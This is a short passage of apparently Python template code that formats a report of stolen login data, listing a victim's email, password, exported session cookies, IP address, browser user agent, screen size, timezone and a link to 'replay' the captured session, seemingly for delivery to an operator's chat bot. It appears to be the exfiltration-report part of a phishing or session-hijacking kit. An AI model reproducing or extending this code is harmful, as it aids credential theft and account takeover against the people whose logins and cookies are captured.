...
👤 <code>{email}</code>
🔑 <code>{pwd}</code>
🍪 <b>{len(critical)} cookies:</b> <code>{cookie_export[:100]}{'...' if len(cookie_export) > 100 else ''}</code>
📍 <b>IP:</b> <code>{ip}</code>
🖥️ <b>UA:</b> <code>{data.get('ua', '')[:50]}...</code>
📱 <b>Screen:</b> {data.get('screen', 'N/A')}
🕒 <b>Timezone:</b> {data.get('timezone', 'N/A')}
🔗 <b>Replay:</b> <a href="{replay_url}">CLICK TO REPLAY SESSION</a>
